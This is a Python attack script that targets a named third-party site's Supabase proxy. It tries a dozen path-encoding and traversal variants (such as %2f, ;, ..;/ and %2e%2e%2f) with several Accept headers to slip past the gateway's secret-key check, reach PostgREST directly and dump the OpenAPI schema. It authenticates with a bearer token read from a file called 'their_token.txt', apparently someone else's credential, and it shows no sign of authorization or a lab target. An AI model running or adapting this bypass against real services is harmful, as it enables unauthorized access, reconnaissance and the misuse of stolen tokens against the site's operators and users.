#!/usr/bin/env python3
"""Focused retest: variants that bypassed the gateway's secret-key classification and reached
PostgREST directly. Goal: obtain the OpenAPI schema (read-only)."""
import ssl, json, time, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
PROXY = "https://onlyfakeai.ru/api/supabase"
KEY = "<publishable-key>"
TOK = json.load(open("their_token.txt"))["access_token"]
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                 urllib.request.HTTPCookieProcessor(cj))
jackpot = []


def get(path, accept=None, auth=("apikey", "both"), tag=""):
    h = {"User-Agent": UA, "apikey": KEY}
    if auth == "both":
        h["Authorization"] = "Bearer " + TOK
    elif auth == "user":
        h["Authorization"] = "Bearer " + TOK
    if accept:
        h["Accept"] = accept
    rq = urllib.request.Request(PROXY + path, headers=h)
    try:
        with op.open(rq, timeout=20) as x:
            st, hb, b = x.status, dict(x.headers), x.read()
    except urllib.error.HTTPError as e:
        st, hb, b = e.code, dict(e.headers), e.read()
    except Exception as e:
        st, hb, b = 0, {}, str(e).encode()
    t = b.decode("utf-8", "ignore")
    is_openapi = ('"openapi"' in t or '"swagger"' in t or '"definitions"' in t or '"paths"' in t)
    if is_openapi:
        jackpot.append((path, accept, st, t))
    print(f"[{tag}] {path} Accept={accept or 'default'} -> {st} ct={hb.get('content-type','')[:30]} "
          f"len={len(b)} openapi={is_openapi} :: {t[:150].replace(chr(10),' ')}")
    time.sleep(0.45)
    return st, t


paths = ["/rest/v1/%2f", "/rest/v1/;", "/rest/v1/%3b", "/rest/v1/%20", "/rest/v1/%23",
         "/rest/v1/%3f", "/rest/v1/index", "/rest/v1/%2e%2e%2f", "/rest/v1/..;/",
         "/rest/v1/%2e/", "/rest/v1/./", "/rest/v1//"]
acc = [None, "application/json", "application/openapi+json", "*/*"]
for p in paths:
    for a in acc:
        st, t = get(p, a, tag="probe")
        # stop this path if we clearly have a schema
        if jackpot:
            break
    if jackpot:
        break

if not jackpot:
    print("\n-- no schema in first pass; trying anon-only key and POST-style on the bypass paths --")
    for p in ["/rest/v1/%2f", "/rest/v1/;", "/rest/v1/index"]:
        for a in [None, "application/json", "application/openapi+json"]:
            get(p, a, auth="apikey")
            if jackpot:
                break
        if jackpot:
            break

print("\n== RESULT ==")
if jackpot:
    for path, a, st, t in jackpot[:1]:
        print(f"JACKPOT {path} Accept={a} -> {st}, {len(t)} bytes")
        open("supabase_openapi_dump.json", "w", encoding="utf-8").write(t)
        print("saved supabase_openapi_dump.json")
else:
    print("no OpenAPI schema obtained")
